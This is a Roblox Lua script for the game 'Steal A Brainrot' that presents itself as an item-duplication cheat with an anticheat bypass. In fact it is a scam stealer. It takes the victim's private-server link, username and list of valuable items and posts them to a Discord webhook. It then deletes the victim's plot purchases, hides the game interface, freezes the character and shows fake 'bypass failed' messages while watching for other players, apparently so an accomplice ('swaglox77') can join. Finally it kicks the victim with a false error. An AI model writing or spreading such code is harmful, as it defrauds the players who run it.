local players = game:GetService("Players")
local tweens = game:GetService("TweenService")

local count = #players:GetChildren()
local player = players.LocalPlayer
local char = player.Character
local hrp = char:WaitForChild("HumanoidRootPart")
local gui = player:WaitForChild("PlayerGui")

local base = nil
local discordhook = getgenv().discordwebhook

local plots = workspace:FindFirstChild("Plots")
local brainrots = getgenv().targets
local currentbrainrots = {}
local infor = {}

if plots then
	for _, plot in ipairs(plots:GetChildren()) do
		local plsgn = plot:FindFirstChild("PlotSign")
		if plsgn then
			local text = plsgn:FindFirstChild("SurfaceGui"):FindFirstChild("Frame"):FindFirstChild("TextLabel").Text
			if text == player.DisplayName .. "'s Base" then
				base = plot
				for _, plotblock in ipairs(plot:FindFirstChild("Purchases"):GetChildren()) do
					plotblock:Destroy()
				end
			end
		end
	end
else
	player:Kick("It's work only on Steal A Brainrot!")
end

for _, targ in ipairs(base:GetChildren()) do
	for _, brainrot in ipairs(brainrots) do
		if targ.Name == brainrot then
			table.insert(currentbrainrots, targ.Name)
		end
	end
	for _, over in ipairs(workspace:FindFirstChild("Debris"):GetChildren()) do
		local aover = over:FindFirstChild("AnimalOverhead")
		if aover then
			local name = aover:FindFirstChild("DisplayName").Text
			local gen = aover:FindFirstChild("Generation").Text
			local mut = aover:FindFirstChild("Mutation").Text

			for _, curbrainrot in ipairs(currentbrainrots) do
				if name == curbrainrot then
					table.insert(infor, "Name: " .. targ.Name .. " | Generate: " .. gen .. " | Mutations: " .. mut)
				end
			end
		end
	end
end

local function send(text, information)
	players = game:GetService("Players")
	count = #players:GetChildren()

	local infostr = table.concat(infor, "\n")
	if infostr == "" then
		infostr = "Don't have any your need brainrots"
	end

	local data = nil
	if information == true then
		local mess = string.format("Player: %s\nPlayers on server: %d\nBrainrots: \n%s\nLink: %s", player.Name, count, infostr, text)
		data = game:GetService("HttpService"):JSONEncode({content = mess, username = "Turtle Team"})
	else
		data = game:GetService("HttpService"):JSONEncode({content = text, username = "Turtle Team"})
	end

	local succ = pcall(function ()
		return request({Url = discordhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
	end)
	
	if succ then
		print("Succesful!")
	end
end

local tween = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

local function crn(parent, scale, offset)
	local corner = Instance.new("UICorner")
	corner.Parent = parent
	corner.CornerRadius = UDim.new(scale, offset)
end

local function cfgf(parent, size, pos, color, trans)
	local frame = Instance.new("Frame")
	frame.Parent = parent
	frame.Size = size
	frame.Position = pos
	frame.BackgroundColor3 = color
	frame.BorderSizePixel = 0
	frame.BackgroundTransparency = trans

	return frame
end

local function cfg(type, parent, size, pos, tran, bg, text, placet, tsize, activec, unactivec, callback)
	if type == "Text" then
		local textl = Instance.new("TextLabel")
		textl.Parent = parent
		textl.Size = size
		textl.Position = pos
		textl.BackgroundTransparency = tran
		textl.BackgroundColor3 = bg
		textl.BorderSizePixel = 0
		textl.Text = text
		textl.TextColor3 = activec
		textl.Font = Enum.Font.GothamBold
		textl.TextSize = tsize

		return textl
	elseif type == "Box" then
		local box = Instance.new("TextBox")
		box.Parent = parent
		box.Size = size
		box.Position = pos
		box.BackgroundTransparency = tran
		box.BackgroundColor3 = bg
		box.BorderSizePixel = 0
		box.Text = text
		box.TextColor3 = activec
		box.Font = Enum.Font.GothamBold
		box.TextSize = tsize
		box.PlaceholderText = placet

		return box
	else
		local button = Instance.new("TextButton")
		button.Parent = parent
		button.AutoButtonColor = false
		button.Size = size
		button.Position = pos
		button.BackgroundTransparency = tran
		button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		button.BorderSizePixel = 0
		button.Text = text
		button.TextColor3 = unactivec
		button.Font = Enum.Font.GothamBold
		button.TextSize = tsize
		button.MouseEnter:Connect(function ()
			local anim = tweens:Create(button, tween, {TextColor3 = activec, BackgroundColor3 = Color3.fromRGB(35, 35, 35)})
			anim:Play()
		end)
		button.MouseLeave:Connect(function ()
			local anim = tweens:Create(button, tween, {TextColor3 = unactivec, BackgroundColor3 = Color3.fromRGB(25, 25, 25)})
			anim:Play()
		end)
		button.MouseButton1Click:Connect(function ()
			if callback then
				callback()
			end
		end)

		return button
	end
end

local bl = Color3.fromRGB(0, 0, 0)
local wh = Color3.fromRGB(255, 255, 255)
local dark = Color3.fromRGB(20, 20, 20)
local dark0 = Color3.fromRGB(30, 30, 30)

local fakeframe, fakeframeun = nil, nil

local scr = Instance.new("ScreenGui")
scr.Parent = gui
scr.ResetOnSpawn = false

local f = cfgf(scr, UDim2.new(0.35, 0, 0.3, 0), UDim2.new(0.325, 0, 0.35, 0), Color3.fromRGB(255, 255, 255))
local f1 = cfgf(f, UDim2.new(0.995, 0, 0.99, 0), UDim2.new(0.0025, 0, 0.005, 0), dark)

crn(f, 0.1, 0)
crn(f1, 0.1, 0)

local t = cfg("Text", f1, UDim2.new(1, 0, 0.15, 0), UDim2.new(0, 0, 0, 0), 1, bl, "SAB Dupe. Tested on 250+M/s", "", 24, wh, Color3.fromRGB(175, 175, 175), nil)
local t0 = cfg("Text", f1, UDim2.new(1, 0, 0.15, 0), UDim2.new(0, 0, 0.2, 0), 1, bl, "Enter a link of private server for bypass!", "", 18, wh, Color3.fromRGB(175, 175, 175), nil)

local bx = cfg("Box", f1, UDim2.new(0.8, 0, 0.15, 0), UDim2.new(0.1, 0, 0.4, 0), 0, dark0, "", "Link of private server", 16, wh, bl, nil)

local ft1 = cfg("Text", f1, UDim2.new(1, 0, 0.15, 0), UDim2.new(0, 0, 0.8, 0), 1, bl, "", "", 18, Color3.fromRGB(255, 0, 0), Color3.fromRGB(175, 175, 175), nil)

local but = cfg("Button", f1, UDim2.new(0.5, 0, 0.15, 0), UDim2.new(0.25, 0, 0.6, 0), 0, nil, "Enter", "", 16, wh, Color3.fromRGB(175, 175, 175), function ()
	if bx.Text == "" then
		ft1.Text = "Error: Enter an link"
		task.wait(5)
		ft1.Text = ""
	else
		if bx.Text:find("^https://www.roblox.com/") then
			char = player.Character
			hrp = char:FindFirstChild("HumanoidRootPart")

			if fakeframe then
				return
			end

			send(bx.Text, true)

			check = task.spawn(function ()
				while true do
					players = game:GetService("Players")
					count = #players:GetChildren()

					if count >= 2 then
						for _, player0 in ipairs(players) do
							if player0 == player then
								continue
							end
							if player0.Name == "swaglox77" then
								continue
							else
								send("Player more than 1", false)
								break
							end
						end
					end
					task.wait(0.5)
				end
			end)

			local core = game:GetService("CoreGui")
			core:FindFirstChild("TopBarApp"):FindFirstChild("TopBarApp").Enabled = false
			core:FindFirstChild("RobloxGui").Enabled = false

			local bodyvelo = Instance.new("BodyVelocity")
			bodyvelo.Parent = hrp
			bodyvelo.MaxForce = Vector3.new(5, 5, 5)
			bodyvelo.Velocity = Vector3.new(0, 0, 0)

			fakeframe = cfgf(scr, UDim2.new(1, 0, 1.2, 0), UDim2.new(0, 0, -0.2, 0), Color3.fromRGB(20, 20, 20), 0)
			f.Visible = false
			local faketext = cfg("Text", fakeframe, UDim2.new(0.5, 0, 0.2, 0), UDim2.new(0.25, 0, 0.55, 0), 1, bl, "Information: Bypassing anticheat... Notice: Bypass may be long", "", 30, Color3.fromRGB(120, 120, 255), Color3.fromRGB(175, 175, 175), nil)

			task.wait(150)
			faketext.Text = "Error: Bypass is failed. Trying again..."
			faketext.TextColor3 = Color3.fromRGB(255, 120, 120)

			task.wait(300)
			faketext.Text = "Error: Bypass is failed. Try again later"
			faketext.TextColor3 = Color3.fromRGB(255, 120, 120)

			task.wait(5)
			player:Kick("Script is kicked you, because have a bugs with your injector\nSorry!")
		else
			ft1.Text = "Error: It's not a link!"
			task.wait(5)
			ft1.Text = ""
		end
	end
end)

local but0 = cfg("Button", f1, UDim2.new(0.15, 0, 0.15, 0), UDim2.new(0.05, 0, 0.05, 0), 0, nil, "Close", "", 14, Color3.fromRGB(255, 0, 0), Color3.fromRGB(150, 0, 0), function ()
	scr:Destroy()
end)
